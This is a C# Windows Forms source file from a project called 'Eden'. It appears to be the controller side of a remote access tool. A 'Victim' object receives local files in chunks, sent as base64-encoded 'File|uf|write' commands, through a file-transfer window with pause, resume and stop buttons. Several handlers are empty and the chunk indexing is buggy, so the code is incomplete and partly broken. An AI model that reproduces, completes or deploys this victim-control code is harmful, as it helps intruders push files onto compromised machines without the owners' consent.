using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileTransfer : Form
    {
        private Victim m_victim;
        public string m_szVictimID;

        private List<string> m_lszFilePath { get; set; }
        private TransferFileType m_transferType { get; set; }

        private Queue<clsTransferFileHandler> m_qTransferFile = new Queue<clsTransferFileHandler>();
        private int m_nChunkSize = 1024 * 5;
        private bool m_bPause { get; set; }
        private bool m_bStop { get; set; }


        public frmFileTransfer(Victim victim, List<string> lszFilePath, TransferFileType transferType)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;

            m_lszFilePath = lszFilePath;
            m_transferType = transferType;
        }

        void fnSrvRecv(Client clnt, string szVictimID, string[] aszMsg)
        {
            if (szVictimID != m_victim.m_szID)
                return;

            try
            {
                if (aszMsg[0] == "file")
                {
                    if (aszMsg[1] == "uf")
                    {

                    }
                    else if (aszMsg[1] == "df")
                    {

                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        void fnWriteLog(string szMsg)
        {
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnUpdateProgress()
        {

        }

        void fnStartTransfer(Queue<clsTransferFileHandler> qTransfer)
        {

            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(10, 10);

            while (qTransfer.Count > 0)
            {
                var handler = qTransfer.Dequeue();
                int nRead = 0;
                byte[] abBuffer = new byte[m_nChunkSize];
                int nIndex = 0;

                while (true)
                {
                    (nRead, abBuffer) = handler.fnabGetChunk();
                    if (nRead == 0)
                        break;

                    ThreadPool.QueueUserWorkItem(x =>
                    {
                        m_victim.fnSendCommand(string.Join("|", new string[]
                        {
                            "File",
                            "uf",
                            "write",
                            handler.m_szFilePath,
                            nIndex.ToString(),
                            m_nChunkSize.ToString(),
                            "0",
                            Convert.ToBase64String(abBuffer),
                        }));
                    });

                    nIndex++;
                }
            }
        }

        void fnSetup()
        {
            //Events
            m_victim.m_clnt.ServerMessageReceived += fnSrvRecv;

            //ListView init
            foreach (string szFilePath in m_lszFilePath)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(szFilePath));
                item.SubItems.Add(szFilePath);
                item.SubItems.Add(string.Empty);

                listView1.Items.Add(item);

                m_qTransferFile.Enqueue(new clsTransferFileHandler(szFilePath));
            }

            //Start
            Task.Run(new Action(() => fnStartTransfer(m_qTransferFile)));
        }

        private void frmFileTransfer_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Folder
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Process.Start("start", m_victim.m_szDirectory);
        }

        private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;
        }

        //Pause
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            m_bPause = true;
        }
        //Resume
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            m_bPause = false;
        }
        //Stop
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            m_bStop = true;
        }
    }
}
